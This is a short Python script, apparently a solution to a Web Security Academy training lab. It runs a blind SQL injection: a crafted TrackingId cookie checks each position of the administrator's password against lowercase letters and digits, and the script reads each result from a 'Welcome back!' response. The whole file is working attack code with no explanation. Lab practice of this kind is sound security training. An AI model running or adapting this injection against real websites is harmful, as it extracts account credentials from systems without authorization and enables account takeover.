import requests
import string

ENDPOINT = "https://0ae7009903202d028123ed77000800e0.web-security-academy.net/"
ADMINISTRATOR_PASSWORD = ""
payload = string.ascii_lowercase + string.digits

for i in range(0, 20):
    for char in payload:
        print(f"Trying {char}")
        cookies = {"TrackingId":f"3w9rdtzOHztrQEie' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTR(password, {i+1} ,1) = '{char}' LIMIT 1) = 'a' --"}
        response = requests.get(ENDPOINT, cookies=cookies)
        if("Welcome back!" in response.text):
            ADMINISTRATOR_PASSWORD += char
            print(f"Current Administrator Password : {ADMINISTRATOR_PASSWORD}")
            break
        